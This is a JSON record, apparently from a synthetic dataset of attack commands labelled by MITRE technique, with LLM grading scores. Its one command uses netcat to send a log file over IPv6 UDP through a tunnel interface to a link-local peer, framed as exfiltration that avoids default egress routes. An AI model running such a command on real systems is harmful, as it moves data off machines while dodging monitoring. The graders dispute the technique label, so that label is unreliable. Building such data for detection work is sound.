@@ -1,0 +1,47 @@
+{
+  "technique_id": "T1011",
+  "platform": "macOS",
+  "shell": "Bash",
+  "command": "nc -6 -u -s \"$(ipconfig getv6ifaddr utun2)\" \"fe80::5:cafe:2%utun2\" 55444 < /tmp/.audit.log",
+  "explanation": "Exfiltrates over a utun (virtual tunnel/VPN) interface using IPv6 UDP and a rare port, satisfying T1011 by using a non-primary network tunnel medium.",
+  "rationale_steps": [
+    "Use ipconfig to read the IPv6 address on utun2 to target the tunnel medium.",
+    "Bind the UDP sender to the utun2 address to avoid default egress routes.",
+    "Send the payload to a link-local peer inside the tunnel on an uncommon port."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1011-7a6bf8eb-6452a689",
+  "source_prompt_hash": "7a6bf8eb",
+  "timestamp_utc": "2025-09-30T08:23:23.913402Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with proper quoting, valid flags for netcat, correct use of command substitution, and proper file redirection syntax.",
+        "semantic_score": 2,
+        "semantic_justification": "While the command does exfiltrate data over IPv6 UDP through a tunnel interface, it does not align with T1011 (Search Closed Sources) which involves acquiring intelligence from non-public information sources rather than network exfiltration techniques.",
+        "combined_score": 3.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T14:16:33.871193Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed Bash with valid nc flags, balanced quoting, proper IPv6 scope syntax, and correct input redirection.",
+        "semantic_score": 4,
+        "semantic_justification": "Sends /tmp/.audit.log via IPv6 UDP bound to utun2 to a link-local peer (plausible exfil over a tunnel), but it does not align with the provided technique description (Search Closed Sources).",
+        "combined_score": 4.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-02T14:17:21.995995Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 3.0,
+    "llm_average_score": 4.0,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
